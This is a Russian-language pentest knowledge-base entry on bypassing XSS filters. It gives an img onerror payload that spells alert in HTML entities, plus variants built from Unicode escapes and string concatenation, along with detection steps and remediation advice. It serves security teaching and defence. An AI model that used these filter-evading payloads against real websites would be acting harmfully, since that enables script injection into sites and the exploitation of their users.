---
id: xss-html-entity-encoding-bypass
title: "XSS: обход фильтра HTML-сущностями и кодировками"
type: xss
target: html
category: web
difficulty: advanced
bypass: waf
tags: [xss, encoding, waf-bypass]
tested_on: ["Chrome 120"]
success_rate: 0.5
risk: medium
cwe: "CWE-79"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/xss/"
  - "https://portswigger.net/web-security/cross-site-scripting"
graph:
  - target: "xss"
    type: instance_of
  - target: "waf-bypass"
    type: technique_of
---

# XSS: обход фильтра HTML-сущностями и кодировками

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

## Explanation

Браузер декодирует HTML-сущности внутри значений атрибутов до выполнения JS,
поэтому `&#97;` эквивалентно `a`. Фильтр, ищущий литерал `alert(`, не сработает.
Работают также `&#x61;` (hex), `&#9;` внутри имён, JS-экранирование `\u0061lert`,
конкатенация `'al'+'ert'`.

## Detection

Сравните ответы на `alert(1)` и `&#97;lert(1)`. Если второе прошло — фильтр работает
по литералам, без нормализации.

## Remediation

- Санитайзер с нормализацией (DOMPurify) перед проверкой.
- WAF: декодирование сущностей/URL/Unicode до сопоставления сигнатур.
- CSP без `unsafe-inline` как последний рубеж.
- Экранирование на выводе делает большинство обходов бессмысленными.

## Variants

```
<img src=x onerror="\u0061lert(1)">
```

```
<img src=x onerror=window['al'+'ert'](1)>
```
